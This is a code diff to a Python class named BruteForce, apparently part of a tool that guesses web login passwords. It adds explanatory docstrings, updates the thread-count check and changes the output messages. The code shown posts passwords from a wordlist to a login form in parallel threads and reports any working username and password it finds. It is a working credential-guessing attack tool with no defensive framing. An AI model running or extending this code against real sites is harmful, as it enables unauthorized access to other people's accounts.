@@ -85,7 +85,7 @@ class BruteForce:
         """
         Extracting Tag Type and Name, storing  in variable, 'tag_type', and 'tag_name'
         """
-        tag_types, tag_names, submit = extracting_tags_attributes(inputs, 'type', 'name')
+        tag_types, tag_names, submit, check_box = extracting_tags_attributes(inputs, 'type', 'name')
         """
         Condition ->
             Checking length of tag_type and tag_name.
@@ -170,15 +170,30 @@ class BruteForce:
             print(error(f'More Than One Form Found: {len(forms)}'))
 
     def proper_response(self, data, word, number):
+        """
+        Check For The Creds.
+        """
         if self.creds_found:
             return
+        """
+        Posting Give DataTo The Given URL. And storing The Response in variable, 'response'. 
+        """
         response = brute_force_request(self.url, data=data, timeout=5)
+        """
+        Checking The Response If login is successful or not.
+        """
         if self.verification in response.content.decode('utf-8'):
+            """
+            If Verbose Mode is True, then printing the following request. Else , not printing.
+            """
             if self.verbose is not None:
                 print(f'\rWorking On {number}\t\tPassword Invalid "{word}"\n', end='')
             else:
                 pass
         else:
+            """
+            If login is successful, then printing the Creds In Proper Manner.
+            """
             self.end = time.time()
             print(f'\rWorking On {number}\t\tPassword Found "{word}"\n', end='')
             self.creds_found = True
@@ -190,30 +205,66 @@ class BruteForce:
                   colored("Password: ", 'blue') + colored(f"{word}", 'green'))
 
     def brute_force(self):
+        """
+        Checking The Connection Of The Website.
+        """
         connection_check(self.url)
         number = 1
+        """
+        Reading Password From The Wordlist
+        """
         words = read(self.passwords_list)
+        """
+        Iterating over each word in the list.
+        """
         for word in words:
+            """
+            Checking If The Creds Are Found. If so then breaking the loop. And Stop all the threads.
+            """
             if self.creds_found:
                 self.exit()
+            """
+            Cleaning The Word From The Special Characters.
+            """
             word = clean_word(word)
+            """
+            Preparing The Dictionary Of Data To Post.
+            """
             data = {
                 self.username_field: self.username,
                 self.password_field: word,
                 self.submit_field_name: 'submit'
             }
+            """
+            Creating The Thread.
+            """
             thread = threading.Thread(target=self.proper_response, args=(data, word, number))
+            """
+            Appending The Thread To The Total Threads List.
+            """
             self.threads.append(thread)
+            """
+            Not letting the thread to Increase the Its Number From The Give Total Threads.
+            """
             try:
-                while threading.activeCount() > int(self.threads_num) + 1:
+                while threading.active_count() > self.threads_num + 1:
                     continue
             except KeyboardInterrupt:
                 sys.exit(0)
+            """
+            Starting The Thread.
+            """
             thread.start()
             number += 1
+        """
+        If The Creds Are Not Found, Then Close All The Threads. And Exit Properly.
+        """
         self.exit()
 
     def collection_of_threads(self):
+        """
+        Joining All The Threads.
+        """
         for thread in self.threads:
             try:
                 thread.join()
@@ -221,15 +272,18 @@ class BruteForce:
                 pass
 
     def exit(self):
+        """
+        Exiting The Program Properly.
+        """
         if not self.creds_found:
-            print("\n[*] - Approaching final keyspace...")
+            success("\n[!] Closing And Quiting All Running Threads.", 'blue')
 
         self.collection_of_threads()
 
         if not self.creds_found:
-            print(f"[-] - Failed to find valid credentials for {self.url}")
+            error(f"[!] Failed to find valid credentials for {self.url}")
             self.end = time.time()
-            print(f"[*] Total time - {self.end - self.start} seconds.")
+            success(f"[*] Total time - {self.end - self.start} seconds.", 'blue')
         sys.exit()
 
 
